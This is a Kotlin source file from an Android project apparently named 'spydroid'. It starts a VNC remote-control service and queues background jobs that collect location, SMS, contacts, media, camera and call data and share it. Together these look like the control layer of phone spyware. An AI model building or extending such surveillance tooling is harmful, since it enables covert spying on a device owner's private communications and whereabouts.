/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.manager.features

import android.content.Context
import android.content.Intent
import android.os.Build
import android.preference.PreferenceManager
import androidx.work.BackoffPolicy
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import androidx.work.WorkRequest
import net.christianbeier.droidvnc_ng.Constants
import net.christianbeier.droidvnc_ng.Defaults
import net.christianbeier.droidvnc_ng.VncService
import net.spydroid.feature.calls.CallsWork
import net.spydroid.feature.camera.CameraWork
import net.spydroid.feature.contacts.ContactsWork
import net.spydroid.feature.location.LocationWork
import net.spydroid.feature.multimedia.MultimediaWork
import net.spydroid.feature.sharedata.ShareDataWork
import net.spydroid.feature.sms.SmsWork
import java.util.concurrent.TimeUnit

@Suppress("DEPRECATION")
class ManagerFeatures(
    private val context: Context
) {

    inner class vnc {
        fun start() {
            val intent = Intent(context, VncService::class.java)
            val prefs = PreferenceManager.getDefaultSharedPreferences(context)
            val mDefaults = Defaults(context)

            intent.putExtra(
                VncService.EXTRA_PORT,
                prefs.getInt(Constants.PREFS_KEY_SETTINGS_PORT, mDefaults.port)
            )
            intent.putExtra(
                VncService.EXTRA_PASSWORD,
                prefs.getString(Constants.PREFS_KEY_SETTINGS_PASSWORD, mDefaults.password)
            )
            intent.putExtra(
                VncService.EXTRA_FILE_TRANSFER,
                prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_FILE_TRANSFER, mDefaults.fileTransfer)
            )
            intent.putExtra(
                VncService.EXTRA_VIEW_ONLY,
                prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_VIEW_ONLY, mDefaults.viewOnly)
            )
            intent.putExtra(
                VncService.EXTRA_SHOW_POINTERS,
                prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_SHOW_POINTERS, mDefaults.showPointers)
            )
            intent.putExtra(
                VncService.EXTRA_SCALING,
                prefs.getFloat(Constants.PREFS_KEY_SETTINGS_SCALING, mDefaults.scaling)
            )
            intent.putExtra(
                VncService.EXTRA_ACCESS_KEY,
                prefs.getString(Constants.PREFS_KEY_SETTINGS_ACCESS_KEY, mDefaults.accessKey)
            )
            intent.setAction(VncService.ACTION_START)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop() {
            val intent = Intent(context, VncService::class.java)
            intent.setAction(VncService.ACTION_STOP)
            context.stopService(intent)
        }
    }

    inner class location() {
        fun start() {
            val locationWork: WorkRequest =
                OneTimeWorkRequest.Builder(LocationWork::class.java).build()
            WorkManager.getInstance(context).enqueue(locationWork)

        }

        fun stop() {
            //todo
        }
    }

    inner class sms() {
        fun start() {
            val smsWork: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
            WorkManager.getInstance(context).enqueue(smsWork)
        }

        fun stop() {
            //todo
        }
    }

    inner class contacts() {
        fun start() {
            val contactsWork: WorkRequest =
                OneTimeWorkRequest.Builder(ContactsWork::class.java).build()
            WorkManager.getInstance(context).enqueue(contactsWork)
        }

        fun stop() {
            //todo
        }
    }

    inner class multimedia() {
        fun start() {
            val multimediaWork: WorkRequest =
                OneTimeWorkRequest.Builder(MultimediaWork::class.java).setBackoffCriteria(
                    BackoffPolicy.LINEAR,  // politics
                    10,  // Time 10 mins
                    TimeUnit.MINUTES
                )
                    .build()

            WorkManager.getInstance(context).enqueue(multimediaWork)
        }

        fun stop() {
            //todo
        }
    }

    inner class camera() {
        fun start() {
            val cameraWOrk: WorkRequest =
                OneTimeWorkRequest.Builder(CameraWork::class.java).build()
            WorkManager.getInstance(context).enqueue(cameraWOrk)
        }

        fun stop() {
            //todo
        }
    }

    inner class calls() {
        fun start() {
            val callsWork: WorkRequest =
                OneTimeWorkRequest.Builder(CallsWork::class.java).build()
            WorkManager.getInstance(context).enqueue(callsWork)
        }

        fun stop() {
            //todo
        }
    }

    inner class shareData() {
        fun start() {
            val shareDataWork: WorkRequest =
                OneTimeWorkRequest.Builder(ShareDataWork::class.java)
                    .build()
            WorkManager.getInstance(context).enqueue(shareDataWork)
        }

        fun stop() {
            //todo
        }
    }
}